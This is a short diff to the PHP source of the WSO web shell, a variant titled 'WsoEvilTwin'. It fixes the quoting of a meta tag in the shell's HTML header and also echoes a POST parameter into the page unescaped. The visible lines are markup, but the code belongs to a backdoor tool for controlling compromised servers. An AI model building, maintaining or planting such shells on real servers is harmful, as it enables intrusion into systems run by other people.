@@ -140,7 +140,7 @@ function wsoHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['default_charset'];
 	global $color;
-	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><meta name="robots" content="NOINDEX. NOFOLLOW"><title>" . $_SERVER['HTTP_HOST'] . " - WsoEvilTwin</title>
+	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><meta name='robots' content='NOINDEX. NOFOLLOW'><title>" . $_SERVER['HTTP_HOST'] . " - WsoEvilTwin</title>
 <style>
 body{background-color:444;color:#e1e1e1;}
 body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
